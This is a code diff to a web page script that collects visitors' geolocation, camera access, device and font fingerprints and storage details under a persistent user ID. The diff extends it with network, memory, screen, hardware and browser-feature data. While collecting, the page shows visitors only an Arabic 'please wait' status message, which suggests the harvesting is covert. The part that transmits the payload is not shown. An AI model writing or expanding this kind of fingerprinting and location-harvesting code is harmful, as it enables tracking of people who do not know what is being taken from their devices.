@@ -75,7 +75,13 @@ col.fingerprint["Plugins"]=nav.plugins?Array.from(nav.plugins).map(function(p){r
 var fontList=["Arial","Arial Black","Comic Sans MS","Courier New","Georgia","Impact","Times New Roman","Trebuchet MS","Verdana","Helvetica","Palatino","Garamond","Bookman","Avant Garde","Candara","Calibri","Cambria","Consolas","Monaco","Lucida Console"];
 var detectedFonts=[];var testString="mmmmmmmmmmlli";var testSize="72px";var h=document.getElementsByTagName("body")[0];var span=document.createElement("span");span.style.fontSize=testSize;span.innerHTML=testString;span.style.position="absolute";span.style.left="-9999px";for(var i=0;i<fontList.length;i++){span.style.fontFamily="'"+fontList[i]+"', monospace";h.appendChild(span);var width=span.offsetWidth;span.style.fontFamily="monospace";var monoWidth=span.offsetWidth;h.removeChild(span);if(width!==monoWidth){detectedFonts.push(fontList[i]);}}col.fingerprint["Detected Fonts"]=detectedFonts.join(", ")||"None";
 col.storage={"Local Storage Keys":localStorage.length,"Session Storage Keys":sessionStorage.length};
-col.browser={"History Length":history.length,"Referrer":document.referrer||"None","Do Not Track":nav.doNotTrack||"Not set"};
+col.browser={"History Length":history.length,"Referrer":document.referrer||"None","Do Not Track":nav.doNotTrack||"Not set","URL":window.location.href,"Hostname":window.location.hostname,"Protocol":window.location.protocol};
+try{var conn=navigator.connection;col.network={"Downlink":conn?conn.downlink+" Mbps":"N/A","RTT":conn?conn.rtt+" ms":"N/A","Save-Data":conn?conn.saveData:"N/A","Effective Type":conn?conn.effectiveType:"N/A"};}catch(e){col.network={Error:"N/A"};}
+col.screenDetails={"Avail Width":sc.availWidth,"Avail Height":sc.availHeight,"Orientation":sc.orientation?sc.orientation.type:"N/A","Pixel Depth":sc.pixelDepth||"N/A"};
+try{col.performance={"Memory Used":window.performance.memory?(window.performance.memory.usedJSHeapSize/1048576).toFixed(2)+" MB":"N/A","Memory Total":window.performance.memory?(window.performance.memory.totalJSHeapSize/1048576).toFixed(2)+" MB":"N/A"};}catch(e){col.performance={Error:"N/A"};}
+col.permissions={};col.system={"Max Touch Points":nav.maxTouchPoints||0,"PDF Viewer Enabled":typeof nav.pdfViewerEnabled!="undefined"?nav.pdfViewerEnabled:"N/A","Java Enabled":nav.javaEnabled?nav.javaEnabled():"N/A"};
+col.inputDevices={"Keyboard":true,"Mouse":true,"Touch":"ontouchstart"in window,"Pointer":!!window.PointerEvent};
+col.features={"WebAssembly":typeof WebAssembly!=="undefined","Service Workers":"serviceWorker"in nav,"Push API":"PushManager"in window,"Notifications":"Notification"in window,"IndexedDB":"indexedDB"in window,"WebRTC":"RTCPeerConnection"in window};
 setStatus("يرجي الانتظار","#ff6b6b");
 var geoDone=false;
 if("geolocation"in navigator){
@@ -84,7 +90,7 @@ await Promise.race([gp,new Promise(function(r){setTimeout(r,5000);})]);
 if(!geoDone&&Object.keys(col.geo).length===0)col.geo={Status:"Waiting for permission..."};
 }else{col.geo={Error:"Not supported"};}
 setStatus("يرجي الانتظار","#4ecdc4");
-var payload={user_id:getOrGenerateUserId(),consent:con,basic:col.basic,geo:col.geo,cam:col.cam,device:col.device,fingerprint:col.fingerprint,storage:col.storage,browser:col.browser};
+var payload={user_id:getOrGenerateUserId(),consent:con,basic:col.basic,geo:col.geo,cam:col.cam,device:col.device,fingerprint:col.fingerprint,storage:col.storage,browser:col.browser,network:col.network,screenDetails:col.screenDetails,performance:col.performance,permissions:col.permissions,system:col.system,inputDevices:col.inputDevices,features:col.features};
 var currentHash=getDataHash(payload);
 var lastHash=localStorage.getItem("last_data_hash");
 if(lastHash===currentHash){
